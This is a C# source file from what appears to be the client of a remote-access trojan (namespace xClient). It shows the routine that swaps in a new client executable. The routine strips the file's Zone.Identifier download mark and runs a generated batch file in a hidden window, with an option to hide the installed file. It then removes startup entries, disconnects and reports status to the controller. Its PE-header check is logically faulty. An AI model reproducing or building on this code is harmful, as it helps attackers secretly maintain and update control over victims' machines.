using System;
using System.Diagnostics;
using System.IO;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Installation
{
    public static class ClientUpdater
    {
        public static void Update(Client c, string newFilePath)
        {
            try
            {
                FileHelper.DeleteZoneIdentifier(newFilePath);

                var bytes = File.ReadAllBytes(newFilePath);
                if (bytes[0] != 'M' && bytes[1] != 'Z')
                    throw new Exception("no pe file");

                string batchFile = FileHelper.CreateUpdateBatch(newFilePath, Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile)) throw new Exception("Could not create update batch file.");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                ClientData.Disconnect = true;
                if (Settings.INSTALL && Settings.STARTUP)
                    Startup.RemoveFromStartup();
                c.Disconnect();
            }
            catch (Exception ex)
            {
                NativeMethods.DeleteFile(newFilePath);
                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(c);
            }
        }
    }
}
